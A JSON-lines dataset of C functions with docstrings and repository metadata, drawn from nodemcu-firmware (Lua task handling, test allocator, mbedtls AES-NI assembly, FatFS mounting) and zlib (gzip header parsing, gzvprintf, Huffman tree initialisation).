{"docstring": "/*\n** Schedule a Lua function for task execution\n*/\n", "func_signal": "LUALIB_API int luaL_posttask( lua_State* L, int prio )", "code": "{          // [-1, +0, -]\n  if (!task_handle)\n    task_handle = platform_task_get_id(do_task);\n\n  if (!lua_isfunction(L, -1) || prio < LUA_TASK_LOW|| prio > LUA_TASK_HIGH)\n    luaL_error(L, \"invalid posk task\");\n//void *cl = clvalue(L->top-1);\n  int task_fn_ref = luaL_ref(L, LUA_REGISTRYINDEX);\n//dbg_printf(\"posting Reg[%u]=%p\\n\",task_fn_ref,cl);\n  if(!platform_post(prio, task_handle, (platform_task_param_t)task_fn_ref)) {\n    luaL_unref(L, LUA_REGISTRYINDEX, task_fn_ref);\n    luaL_error(L, \"Task queue overflow. Task not posted\");\n  }\n  return task_fn_ref;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** Error Reporting Task.  We can't pass a string parameter to the error reporter\n** directly through the task interface the call is wrapped in a C closure with\n** the error string as an Upval and this is posted to call the Lua reporter.\n*/\n", "func_signal": "static int errhandler_aux (lua_State *L)", "code": "{\n  lua_getfield(L, LUA_REGISTRYINDEX, \"onerror\");\n  if (!lua_isfunction(L, -1)) {\n    lua_pop(L, 1);\n    lua_getglobal(L, \"print\");\n  }\n  lua_pushvalue(L, lua_upvalueindex(1));\n  lua_call(L, 1, 0);  /* Using an error handler would cause an infinite loop! */\n  return 0;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** mark all objects in gray lists with the TESTGRAYBIT, so that\n** 'checkmemory' can check that all gray objects are in a gray list\n*/\n", "func_signal": "static void markgrays (global_State *g)", "code": "{\n  if (!keepinvariant(g)) return;\n  checkgraylist(g, g->gray);\n  checkgraylist(g, g->grayagain);\n  checkgraylist(g, g->weak);\n  checkgraylist(g, g->ephemeron);\n  checkgraylist(g, g->allweak);\n}", "path": "nodemcu-firmware/app/lua53/host/ltests.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * Key expansion, 128-bit case\n */\n", "func_signal": "static void aesni_setkey_enc_128( unsigned char *rk,\n                                  const unsigned char *key )", "code": "{\n    asm( \"movdqu (%1), %%xmm0               \\n\\t\" // copy the original key\n         \"movdqu %%xmm0, (%0)               \\n\\t\" // as round key 0\n         \"jmp 2f                            \\n\\t\" // skip auxiliary routine\n\n         /*\n          * Finish generating the next round key.\n          *\n          * On entry xmm0 is r3:r2:r1:r0 and xmm1 is X:stuff:stuff:stuff\n          * with X = rot( sub( r3 ) ) ^ RCON.\n          *\n          * On exit, xmm0 is r7:r6:r5:r4\n          * with r4 = X + r0, r5 = r4 + r1, r6 = r5 + r2, r7 = r6 + r3\n          * and those are written to the round key buffer.\n          */\n         \"1:                                \\n\\t\"\n         \"pshufd $0xff, %%xmm1, %%xmm1      \\n\\t\" // X:X:X:X\n         \"pxor %%xmm0, %%xmm1               \\n\\t\" // X+r3:X+r2:X+r1:r4\n         \"pslldq $4, %%xmm0                 \\n\\t\" // r2:r1:r0:0\n         \"pxor %%xmm0, %%xmm1               \\n\\t\" // X+r3+r2:X+r2+r1:r5:r4\n         \"pslldq $4, %%xmm0                 \\n\\t\" // etc\n         \"pxor %%xmm0, %%xmm1               \\n\\t\"\n         \"pslldq $4, %%xmm0                 \\n\\t\"\n         \"pxor %%xmm1, %%xmm0               \\n\\t\" // update xmm0 for next time!\n         \"add $16, %0                       \\n\\t\" // point to next round key\n         \"movdqu %%xmm0, (%0)               \\n\\t\" // write it\n         \"ret                               \\n\\t\"\n\n         /* Main \"loop\" */\n         \"2:                                \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x01        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x02        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x04        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x08        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x10        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x20        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x40        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x80        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x1B        \\n\\tcall 1b \\n\\t\"\n         AESKEYGENA xmm0_xmm1 \",0x36        \\n\\tcall 1b \\n\\t\"\n         :\n         : \"r\" (rk), \"r\" (key)\n         : \"memory\", \"cc\", \"0\" );\n}", "path": "nodemcu-firmware/app/mbedtls/library/aesni.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "//DEBUG\n", "func_signal": "void *debug_realloc (void *ud, void *b, size_t oldsize, size_t size)", "code": "{\n  Memcontrol *mc = cast(Memcontrol *, ud);\n  Header *block = cast(Header *, b);\n  int type;\n  if (mc->memlimit == 0) {  /* first time? */\n    char *limit = getenv(\"MEMLIMIT\");  /* initialize memory limit */\n    mc->memlimit = limit ? strtoul(limit, NULL, 10) : ULONG_MAX;\n  }\n  if (block == NULL) {\n    type = (oldsize < LUA_NUMTAGS) ? oldsize : 0;\n    oldsize = 0;\n  }\n  else {\n    block--;  /* go to real header */\n    type = block->d.type;\n    lua_assert(oldsize == block->d.size);\n  }\n  if (size == 0) {\n    freeblock(mc, block);\n    return NULL;\n  }\n  else if (size > oldsize && mc->total+size-oldsize > mc->memlimit)\n    return NULL;  /* fake a memory allocation error */\n  else {\n    Header *newblock;\n    int i;\n    size_t commonsize = (oldsize < size) ? oldsize : size;\n    size_t realsize = sizeof(Header) + size + MARKSIZE;\n    if (realsize < size) return NULL;  /* arithmetic overflow! */\n    newblock = cast(Header *, malloc(realsize));  /* alloc a new block */\nsize_t op = (char *) newblock- (char *) LFSregion;                      //DEBUG\nlua_assert(op>0x20000);                                                 //DEBUG\n    if (newblock == NULL) return NULL;  /* really out of memory? */\n    if (block) {\n      memcpy(newblock + 1, block + 1, commonsize);  /* copy old contents */\n      freeblock(mc, block);  /* erase (and check) old copy */\n    }\n    /* initialize new part of the block with something weird */\n    fillmem(cast(char *, newblock + 1) + commonsize, size - commonsize);\n    /* initialize marks after block */\n    for (i = 0; i < MARKSIZE; i++)\n      *(cast(char *, newblock + 1) + size + i) = MARK;\n    newblock->d.size = size;\n    newblock->d.type = type;\n    newblock->d.next = headBlock.d.next;\n    newblock->d.prev = &headBlock;\n    newblock->d.next->d.prev = newblock;\n    headBlock.d.next = newblock;\n    mc->total += size;\n    if (mc->total > mc->maxmem)\n      mc->maxmem = mc->total;\n    mc->numblocks++;\n    mc->objcount[type]++;\n    return newblock + 1;\n  }\n}", "path": "nodemcu-firmware/app/lua53/host/ltests.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * AES-NI AES-ECB block en(de)cryption\n */\n", "func_signal": "int mbedtls_aesni_crypt_ecb( mbedtls_aes_context *ctx,\n                     int mode,\n                     const unsigned char input[16],\n                     unsigned char output[16] )", "code": "{\n    asm( \"movdqu    (%3), %%xmm0    \\n\\t\" // load input\n         \"movdqu    (%1), %%xmm1    \\n\\t\" // load round key 0\n         \"pxor      %%xmm1, %%xmm0  \\n\\t\" // round 0\n         \"add       $16, %1         \\n\\t\" // point to next round key\n         \"subl      $1, %0          \\n\\t\" // normal rounds = nr - 1\n         \"test      %2, %2          \\n\\t\" // mode?\n         \"jz        2f              \\n\\t\" // 0 = decrypt\n\n         \"1:                        \\n\\t\" // encryption loop\n         \"movdqu    (%1), %%xmm1    \\n\\t\" // load round key\n         AESENC     xmm1_xmm0      \"\\n\\t\" // do round\n         \"add       $16, %1         \\n\\t\" // point to next round key\n         \"subl      $1, %0          \\n\\t\" // loop\n         \"jnz       1b              \\n\\t\"\n         \"movdqu    (%1), %%xmm1    \\n\\t\" // load round key\n         AESENCLAST xmm1_xmm0      \"\\n\\t\" // last round\n         \"jmp       3f              \\n\\t\"\n\n         \"2:                        \\n\\t\" // decryption loop\n         \"movdqu    (%1), %%xmm1    \\n\\t\"\n         AESDEC     xmm1_xmm0      \"\\n\\t\" // do round\n         \"add       $16, %1         \\n\\t\"\n         \"subl      $1, %0          \\n\\t\"\n         \"jnz       2b              \\n\\t\"\n         \"movdqu    (%1), %%xmm1    \\n\\t\" // load round key\n         AESDECLAST xmm1_xmm0      \"\\n\\t\" // last round\n\n         \"3:                        \\n\\t\"\n         \"movdqu    %%xmm0, (%4)    \\n\\t\" // export output\n         :\n         : \"r\" (ctx->nr), \"r\" (ctx->rk), \"r\" (mode), \"r\" (input), \"r\" (output)\n         : \"memory\", \"cc\", \"xmm0\", \"xmm1\" );\n\n\n    return( 0 );\n}", "path": "nodemcu-firmware/app/mbedtls/library/aesni.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/* Push the LClosure of the LFS index function */\n", "func_signal": "LUA_API int lua_pushlfsindex (lua_State *L)", "code": "{\n  lua_lock(L);\n  Proto *p = G(L)->ROpvmain;\n  if (p) {\n    Closure *cl = luaF_newLclosure(L, 0, hvalue(gt(L)));\n    cl->l.p = p;\n    setclvalue(L, L->top, cl);\n  } else {\n    setnilvalue(L->top);\n  }\n  api_incr_top(L);\n  lua_unlock(L);\n  return p ? LUA_TFUNCTION : LUA_TNIL;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * Key expansion, wrapper\n */\n", "func_signal": "int mbedtls_aesni_setkey_enc( unsigned char *rk,\n                      const unsigned char *key,\n                      size_t bits )", "code": "{\n    switch( bits )\n    {\n        case 128: aesni_setkey_enc_128( rk, key ); break;\n        case 192: aesni_setkey_enc_192( rk, key ); break;\n        case 256: aesni_setkey_enc_256( rk, key ); break;\n        default : return( MBEDTLS_ERR_AES_INVALID_KEY_LENGTH );\n    }\n\n    return( 0 );\n}", "path": "nodemcu-firmware/app/mbedtls/library/aesni.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * GCM multiplication: c = a times b in GF(2^128)\n * Based on [CLMUL-WP] algorithms 1 (with equation 27) and 5.\n */\n", "func_signal": "void mbedtls_aesni_gcm_mult( unsigned char c[16],\n                     const unsigned char a[16],\n                     const unsigned char b[16] )", "code": "{\n    unsigned char aa[16], bb[16], cc[16];\n    size_t i;\n\n    /* The inputs are in big-endian order, so byte-reverse them */\n    for( i = 0; i < 16; i++ )\n    {\n        aa[i] = a[15 - i];\n        bb[i] = b[15 - i];\n    }\n\n    asm( \"movdqu (%0), %%xmm0               \\n\\t\" // a1:a0\n         \"movdqu (%1), %%xmm1               \\n\\t\" // b1:b0\n\n         /*\n          * Caryless multiplication xmm2:xmm1 = xmm0 * xmm1\n          * using [CLMUL-WP] algorithm 1 (p. 13).\n          */\n         \"movdqa %%xmm1, %%xmm2             \\n\\t\" // copy of b1:b0\n         \"movdqa %%xmm1, %%xmm3             \\n\\t\" // same\n         \"movdqa %%xmm1, %%xmm4             \\n\\t\" // same\n         PCLMULQDQ xmm0_xmm1 \",0x00         \\n\\t\" // a0*b0 = c1:c0\n         PCLMULQDQ xmm0_xmm2 \",0x11         \\n\\t\" // a1*b1 = d1:d0\n         PCLMULQDQ xmm0_xmm3 \",0x10         \\n\\t\" // a0*b1 = e1:e0\n         PCLMULQDQ xmm0_xmm4 \",0x01         \\n\\t\" // a1*b0 = f1:f0\n         \"pxor %%xmm3, %%xmm4               \\n\\t\" // e1+f1:e0+f0\n         \"movdqa %%xmm4, %%xmm3             \\n\\t\" // same\n         \"psrldq $8, %%xmm4                 \\n\\t\" // 0:e1+f1\n         \"pslldq $8, %%xmm3                 \\n\\t\" // e0+f0:0\n         \"pxor %%xmm4, %%xmm2               \\n\\t\" // d1:d0+e1+f1\n         \"pxor %%xmm3, %%xmm1               \\n\\t\" // c1+e0+f1:c0\n\n         /*\n          * Now shift the result one bit to the left,\n          * taking advantage of [CLMUL-WP] eq 27 (p. 20)\n          */\n         \"movdqa %%xmm1, %%xmm3             \\n\\t\" // r1:r0\n         \"movdqa %%xmm2, %%xmm4             \\n\\t\" // r3:r2\n         \"psllq $1, %%xmm1                  \\n\\t\" // r1<<1:r0<<1\n         \"psllq $1, %%xmm2                  \\n\\t\" // r3<<1:r2<<1\n         \"psrlq $63, %%xmm3                 \\n\\t\" // r1>>63:r0>>63\n         \"psrlq $63, %%xmm4                 \\n\\t\" // r3>>63:r2>>63\n         \"movdqa %%xmm3, %%xmm5             \\n\\t\" // r1>>63:r0>>63\n         \"pslldq $8, %%xmm3                 \\n\\t\" // r0>>63:0\n         \"pslldq $8, %%xmm4                 \\n\\t\" // r2>>63:0\n         \"psrldq $8, %%xmm5                 \\n\\t\" // 0:r1>>63\n         \"por %%xmm3, %%xmm1                \\n\\t\" // r1<<1|r0>>63:r0<<1\n         \"por %%xmm4, %%xmm2                \\n\\t\" // r3<<1|r2>>62:r2<<1\n         \"por %%xmm5, %%xmm2                \\n\\t\" // r3<<1|r2>>62:r2<<1|r1>>63\n\n         /*\n          * Now reduce modulo the GCM polynomial x^128 + x^7 + x^2 + x + 1\n          * using [CLMUL-WP] algorithm 5 (p. 20).\n          * Currently xmm2:xmm1 holds x3:x2:x1:x0 (already shifted).\n          */\n         /* Step 2 (1) */\n         \"movdqa %%xmm1, %%xmm3             \\n\\t\" // x1:x0\n         \"movdqa %%xmm1, %%xmm4             \\n\\t\" // same\n         \"movdqa %%xmm1, %%xmm5             \\n\\t\" // same\n         \"psllq $63, %%xmm3                 \\n\\t\" // x1<<63:x0<<63 = stuff:a\n         \"psllq $62, %%xmm4                 \\n\\t\" // x1<<62:x0<<62 = stuff:b\n         \"psllq $57, %%xmm5                 \\n\\t\" // x1<<57:x0<<57 = stuff:c\n\n         /* Step 2 (2) */\n         \"pxor %%xmm4, %%xmm3               \\n\\t\" // stuff:a+b\n         \"pxor %%xmm5, %%xmm3               \\n\\t\" // stuff:a+b+c\n         \"pslldq $8, %%xmm3                 \\n\\t\" // a+b+c:0\n         \"pxor %%xmm3, %%xmm1               \\n\\t\" // x1+a+b+c:x0 = d:x0\n\n         /* Steps 3 and 4 */\n         \"movdqa %%xmm1,%%xmm0              \\n\\t\" // d:x0\n         \"movdqa %%xmm1,%%xmm4              \\n\\t\" // same\n         \"movdqa %%xmm1,%%xmm5              \\n\\t\" // same\n         \"psrlq $1, %%xmm0                  \\n\\t\" // e1:x0>>1 = e1:e0'\n         \"psrlq $2, %%xmm4                  \\n\\t\" // f1:x0>>2 = f1:f0'\n         \"psrlq $7, %%xmm5                  \\n\\t\" // g1:x0>>7 = g1:g0'\n         \"pxor %%xmm4, %%xmm0               \\n\\t\" // e1+f1:e0'+f0'\n         \"pxor %%xmm5, %%xmm0               \\n\\t\" // e1+f1+g1:e0'+f0'+g0'\n         // e0'+f0'+g0' is almost e0+f0+g0, ex\\tcept for some missing\n         // bits carried from d. Now get those\\t bits back in.\n         \"movdqa %%xmm1,%%xmm3              \\n\\t\" // d:x0\n         \"movdqa %%xmm1,%%xmm4              \\n\\t\" // same\n         \"movdqa %%xmm1,%%xmm5              \\n\\t\" // same\n         \"psllq $63, %%xmm3                 \\n\\t\" // d<<63:stuff\n         \"psllq $62, %%xmm4                 \\n\\t\" // d<<62:stuff\n         \"psllq $57, %%xmm5                 \\n\\t\" // d<<57:stuff\n         \"pxor %%xmm4, %%xmm3               \\n\\t\" // d<<63+d<<62:stuff\n         \"pxor %%xmm5, %%xmm3               \\n\\t\" // missing bits of d:stuff\n         \"psrldq $8, %%xmm3                 \\n\\t\" // 0:missing bits of d\n         \"pxor %%xmm3, %%xmm0               \\n\\t\" // e1+f1+g1:e0+f0+g0\n         \"pxor %%xmm1, %%xmm0               \\n\\t\" // h1:h0\n         \"pxor %%xmm2, %%xmm0               \\n\\t\" // x3+h1:x2+h0\n\n         \"movdqu %%xmm0, (%2)               \\n\\t\" // done\n         :\n         : \"r\" (aa), \"r\" (bb), \"r\" (cc)\n         : \"memory\", \"cc\", \"xmm0\", \"xmm1\", \"xmm2\", \"xmm3\", \"xmm4\", \"xmm5\" );\n\n    /* Now byte-reverse the outputs */\n    for( i = 0; i < 16; i++ )\n        c[i] = cc[15 - i];\n\n    return;\n}", "path": "nodemcu-firmware/app/mbedtls/library/aesni.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** sets 'registry.C_HOOK[L] = scpt' and sets 'Chook' as a hook\n*/\n", "func_signal": "static void sethookaux (lua_State *L, int mask, int count, const char *scpt)", "code": "{\n  if (*scpt == '\\0') {  /* no script? */\n    lua_sethook(L, NULL, 0, 0);  /* turn off hooks */\n    return;\n  }\n  lua_getfield(L, LUA_REGISTRYINDEX, \"C_HOOK\");  /* get C_HOOK table */\n  if (!lua_istable(L, -1)) {  /* no hook table? */\n    lua_pop(L, 1);  /* remove previous value */\n    lua_newtable(L);  /* create new C_HOOK table */\n    lua_pushvalue(L, -1);\n    lua_setfield(L, LUA_REGISTRYINDEX, \"C_HOOK\");  /* register it */\n  }\n  lua_pushlightuserdata(L, L);\n  lua_pushstring(L, scpt);\n  lua_settable(L, -3);  /* C_HOOK[L] = script */\n  lua_sethook(L, Chook, mask, count);\n}", "path": "nodemcu-firmware/app/lua53/host/ltests.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** All marks are conditional because a GC may happen while the\n** prototype is still being created\n*/\n", "func_signal": "static void checkproto (global_State *g, Proto *f)", "code": "{\n  int i;\n  GCObject *fgc = obj2gco(f);\n  checkobjref(g, fgc, f->source);\n  for (i=0; i<f->sizek; i++) {\n    if (ttisstring(f->k + i))\n      checkobjref(g, fgc, tsvalue(f->k + i));\n  }\n  for (i=0; i<f->sizeupvalues; i++)\n    checkobjref(g, fgc, f->upvalues[i].name);\n  for (i=0; i<f->sizep; i++)\n    checkobjref(g, fgc, f->p[i]);\n  for (i=0; i<f->sizelocvars; i++)\n    checkobjref(g, fgc, f->locvars[i].varname);\n}", "path": "nodemcu-firmware/app/lua53/host/ltests.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** Task callback handler. Uses luaN_call to do a protected call with full traceback\n*/\n", "func_signal": "static void do_task (platform_task_param_t task_fn_ref, uint8_t prio)", "code": "{\n  lua_State* L = lua_getstate();\n  if (prio < 0|| prio > 2)\n    luaL_error(L, \"invalid posk task\");\n\n/* Pop the CB func from the Reg */\n//dbg_printf(\"calling Reg[%u]\\n\", task_fn_ref);\n  lua_rawgeti(L, LUA_REGISTRYINDEX, (int) task_fn_ref);\n  luaL_checkfunction(L, -1);\n  luaL_unref(L, LUA_REGISTRYINDEX, (int) task_fn_ref);\n  lua_pushinteger(L, prio);\n  luaL_pcallx(L, 1, 0);\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n** Error handler for luaL_pcallx(), called from the lua_pcall() with a single \n** argument -- the thrown error. This plus depth=2 is passed to debug.traceback()\n** to convert into an error message which it handles in a separate posted task.\n*/\n", "func_signal": "static int errhandler (lua_State *L)", "code": "{\n  lua_getglobal(L, \"debug\");\n  lua_getfield(L, -1, \"traceback\");\n  if (lua_isfunction(L, -1)) {\n    lua_insert(L, 1);                 /* insert tracback function above error */\n    lua_pop(L, 1);                              /* dump the debug table entry */\n    lua_pushinteger(L, 2);                /* skip this function and traceback */\n    lua_call(L, 2, 1);      /* call debug.traceback and return it as a string */\n    lua_pushcclosure(L, errhandler_aux, 1);       /* report with str as upval */\n    luaL_posttask(L, LUA_TASK_HIGH);\n  }\n  return 0;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/*\n * Return the Unix timestamp of the LFS image creation\n */\n", "func_signal": "LUALIB_API int luaL_pushlfsdts (lua_State *L)", "code": "{\n  if (lua_pushlfsindex(L) == LUA_TNIL)\n    return 0;              /* return nil if LFS not loaded */\n  lua_call(L, 0, 1);\n  return 1;\n}", "path": "nodemcu-firmware/app/lua/lnodemcu.c", "commit_date": "2020-08-22 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "// ---------------------------------------------------------------------------\n// filesystem functions\n//\n", "func_signal": "static vfs_vol *myfatfs_mount( const char *name, int num )", "code": "{\n  struct myvfs_vol *vol;\n  const size_t len = strlen( name );\n\n  // num argument specifies the physical driver = SS/CS pin number for this sd card\n  if (num >= 0) {\n    for (int i = 0; i < NUM_LOGICAL_DRIVES; i++) {\n      if (0 == strncmp( name, volstr[i], strlen( volstr[i] ) )) {\n        VolToPart[i].pd = num;\n      }\n    }\n  }\n\n  if (vol = malloc( sizeof( struct myvfs_vol ) )) {\n    if (vol->ldrname = strdup( name )) {\n      if (FR_OK == (last_result = f_mount( &(vol->fs), name, 1 ))) {\n\tvol->vfs_vol.fs_type = VFS_FS_FATFS;\n\tvol->vfs_vol.fns     = &myfatfs_vol_fns;\n\treturn (vfs_vol *)vol;\n      }\n    }\n  }\n\n  if (vol) {\n    if (vol->ldrname) free( vol->ldrname );\n    free( vol );\n  }\n  return NULL;\n}", "path": "nodemcu-firmware/app/fatfs/myfatfs.c", "commit_date": "2019-07-21 00:00:00", "repo_name": "nodemcu/nodemcu-firmware", "stars": 7541, "license": "mit", "language": "c", "size": 112992}
{"docstring": "/* skip over gzip header */\n", "func_signal": "local void gzheader(file *in)", "code": "{\n    int flags;\n    unsigned n;\n\n    if (read1(in) != 31 || read1(in) != 139) bye(in->name, \" not a gzip file\");\n    if (read1(in) != 8) bye(\"unknown compression method in\", in->name);\n    flags = read1(in);\n    if (flags & 0xe0) bye(\"unknown header flags set in\", in->name);\n    skip(in, 6);\n    if (flags & 4) {\n        n = read1(in);\n        n += (unsigned)(read1(in)) << 8;\n        skip(in, n);\n    }\n    if (flags & 8) while (read1(in) != 0) ;\n    if (flags & 16) while (read1(in) != 0) ;\n    if (flags & 2) skip(in, 2);\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* read a four-byte unsigned integer, little-endian, from in */\n", "func_signal": "unsigned long read4(file *in)", "code": "{\n    unsigned long val;\n\n    val = read1(in);\n    val += (unsigned)read1(in) << 8;\n    val += (unsigned long)read1(in) << 16;\n    val += (unsigned long)read1(in) << 24;\n    return val;\n}", "path": "zlib/examples/gzappend.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* -- see zlib.h -- */\n", "func_signal": "int ZEXPORTVA gzvprintf(gzFile file, const char *format, va_list va)", "code": "{\n    int len;\n    unsigned left;\n    char *next;\n    gz_statep state;\n    z_streamp strm;\n\n    /* get internal structure */\n    if (file == NULL)\n        return Z_STREAM_ERROR;\n    state = (gz_statep)file;\n    strm = &(state->strm);\n\n    /* check that we're writing and that there's no error */\n    if (state->mode != GZ_WRITE || state->err != Z_OK)\n        return Z_STREAM_ERROR;\n\n    /* make sure we have some buffer space */\n    if (state->size == 0 && gz_init(state) == -1)\n        return state->err;\n\n    /* check for seek request */\n    if (state->seek) {\n        state->seek = 0;\n        if (gz_zero(state, state->skip) == -1)\n            return state->err;\n    }\n\n    /* do the printf() into the input buffer, put length in len -- the input\n       buffer is double-sized just for this function, so there is guaranteed to\n       be state->size bytes available after the current contents */\n    if (strm->avail_in == 0)\n        strm->next_in = state->in;\n    next = (char *)(state->in + (strm->next_in - state->in) + strm->avail_in);\n    next[state->size - 1] = 0;\n#ifdef NO_vsnprintf\n#  ifdef HAS_vsprintf_void\n    (void)vsprintf(next, format, va);\n    for (len = 0; len < state->size; len++)\n        if (next[len] == 0) break;\n#  else\n    len = vsprintf(next, format, va);\n#  endif\n#else\n#  ifdef HAS_vsnprintf_void\n    (void)vsnprintf(next, state->size, format, va);\n    len = strlen(next);\n#  else\n    len = vsnprintf(next, state->size, format, va);\n#  endif\n#endif\n\n    /* check that printf() results fit in buffer */\n    if (len == 0 || (unsigned)len >= state->size || next[state->size - 1] != 0)\n        return 0;\n\n    /* update buffer and position, compress first half if past that */\n    strm->avail_in += (unsigned)len;\n    state->x.pos += len;\n    if (strm->avail_in >= state->size) {\n        left = strm->avail_in - state->size;\n        strm->avail_in = state->size;\n        if (gz_comp(state, Z_NO_FLUSH) == -1)\n            return state->err;\n        memmove(state->in, state->in + state->size, left);\n        strm->next_in = state->in;\n        strm->avail_in = left;\n    }\n    return len;\n}", "path": "zlib/gzwrite.c", "commit_date": "2019-04-14 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
{"docstring": "/* ===========================================================================\n * Initialize the various 'constant' tables.\n */\n", "func_signal": "local void tr_static_init()", "code": "{\n#if defined(GEN_TREES_H) || !defined(STDC)\n    static int static_init_done = 0;\n    int n;        /* iterates over tree elements */\n    int bits;     /* bit counter */\n    int length;   /* length value */\n    int code;     /* code value */\n    int dist;     /* distance index */\n    ush bl_count[MAX_BITS+1];\n    /* number of codes at each bit length for an optimal tree */\n\n    if (static_init_done) return;\n\n    /* For some embedded targets, global variables are not initialized: */\n#ifdef NO_INIT_GLOBAL_POINTERS\n    static_l_desc.static_tree = static_ltree;\n    static_l_desc.extra_bits = extra_lbits;\n    static_d_desc.static_tree = static_dtree;\n    static_d_desc.extra_bits = extra_dbits;\n    static_bl_desc.extra_bits = extra_blbits;\n#endif\n\n    /* Initialize the mapping length (0..255) -> length code (0..28) */\n    length = 0;\n    for (code = 0; code < LENGTH_CODES-1; code++) {\n        base_length[code] = length;\n        for (n = 0; n < (1<<extra_lbits[code]); n++) {\n            _length_code[length++] = (uch)code;\n        }\n    }\n    Assert (length == 256, \"tr_static_init: length != 256\");\n    /* Note that the length 255 (match length 258) can be represented\n     * in two different ways: code 284 + 5 bits or code 285, so we\n     * overwrite length_code[255] to use the best encoding:\n     */\n    _length_code[length-1] = (uch)code;\n\n    /* Initialize the mapping dist (0..32K) -> dist code (0..29) */\n    dist = 0;\n    for (code = 0 ; code < 16; code++) {\n        base_dist[code] = dist;\n        for (n = 0; n < (1<<extra_dbits[code]); n++) {\n            _dist_code[dist++] = (uch)code;\n        }\n    }\n    Assert (dist == 256, \"tr_static_init: dist != 256\");\n    dist >>= 7; /* from now on, all distances are divided by 128 */\n    for ( ; code < D_CODES; code++) {\n        base_dist[code] = dist << 7;\n        for (n = 0; n < (1<<(extra_dbits[code]-7)); n++) {\n            _dist_code[256 + dist++] = (uch)code;\n        }\n    }\n    Assert (dist == 256, \"tr_static_init: 256+dist != 512\");\n\n    /* Construct the codes of the static literal tree */\n    for (bits = 0; bits <= MAX_BITS; bits++) bl_count[bits] = 0;\n    n = 0;\n    while (n <= 143) static_ltree[n++].Len = 8, bl_count[8]++;\n    while (n <= 255) static_ltree[n++].Len = 9, bl_count[9]++;\n    while (n <= 279) static_ltree[n++].Len = 7, bl_count[7]++;\n    while (n <= 287) static_ltree[n++].Len = 8, bl_count[8]++;\n    /* Codes 286 and 287 do not exist, but we must include them in the\n     * tree construction to get a canonical Huffman tree (longest code\n     * all ones)\n     */\n    gen_codes((ct_data *)static_ltree, L_CODES+1, bl_count);\n\n    /* The static distance tree is trivial: */\n    for (n = 0; n < D_CODES; n++) {\n        static_dtree[n].Len = 5;\n        static_dtree[n].Code = bi_reverse((unsigned)n, 5);\n    }\n    static_init_done = 1;\n\n#  ifdef GEN_TREES_H\n    gen_trees_header();\n#  endif\n#endif /* defined(GEN_TREES_H) || !defined(STDC) */\n}", "path": "zlib/trees.c", "commit_date": "2018-04-20 00:00:00", "repo_name": "madler/zlib", "stars": 5169, "license": "other", "language": "c", "size": 3793}
